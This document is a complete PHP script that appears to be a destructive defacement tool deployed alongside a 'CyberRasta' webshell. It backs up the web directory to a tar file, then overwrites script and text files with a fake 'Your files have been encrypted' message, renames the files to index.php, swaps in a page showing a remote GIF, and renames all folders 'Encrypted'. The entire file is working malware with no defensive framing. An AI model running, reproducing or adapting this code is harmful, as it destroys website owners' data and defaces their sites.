<?php

function addFilesToZip($zip, $dir) {
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($dir) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
}

function createBackup($dir, $backupFile) {
    $zip = new PharData($backupFile);
    addFilesToZip($zip, $dir);
}

function monster($dir, $backupFile) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($iterator as $fileInfo) {
            $oldName = $fileInfo->getPathname();

            if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7' || $oldName === $backupFile) {
                continue;
            }

            if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
                file_put_contents($oldName, '<?php echo "<h1>Your files have been encrypted by Cyber Rasta</h1>"; ?>');
            }

            $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'index.php';

            if (file_exists($newName)) {
                $i = 1;
                while (file_exists($newName . " ($i)")) {
                    $i++;
                }
                $newName .= " ($i)";
            }

            if ($fileInfo->isFile() && !rename($oldName, $newName)) {
                throw new Exception("Não foi possível renomear $oldName");
            }

            
            if (file_exists($newName)) {
                $imageContent = '<!DOCTYPE html><html><head><style>body{margin:0;}img{display:block;width:100%;height:100vh;}</style></head><body><img src="https://s10.gifyu.com/images/StY8h.gif" alt="Imagem"></body></html>';
                file_put_contents($newName, $imageContent);
            }
        }

        foreach ($iterator as $fileInfo) {
            if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7' || $fileInfo->getPathname() === $backupFile) {
                continue;
            }

            if ($fileInfo->isDir()) {
                $oldName = $fileInfo->getPathname();
                $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'Encrypted';

                if (file_exists($newName)) {
                    $i = 1;
                    while (file_exists($newName . " ($i)")) {
                        $i++;
                    }
                    $newName .= " ($i)";
                }

                if (!rename($oldName, $newName)) {
                    throw new Exception("Não foi possível renomear $oldName");
                }
            }
        }
    } catch (Exception $e) {
        error_log($e->getMessage());
        echo "Ocorreu um erro durante o processo de modificação. Consulte o log de erros para mais detalhes.\n";
    }
}

$directory = __DIR__;
$backupFile = $directory . DIRECTORY_SEPARATOR . 'backup_' . date('Y-m-d_H-i-s') . '.tar';
createBackup($directory, $backupFile);
monster($directory, $backupFile);

?>
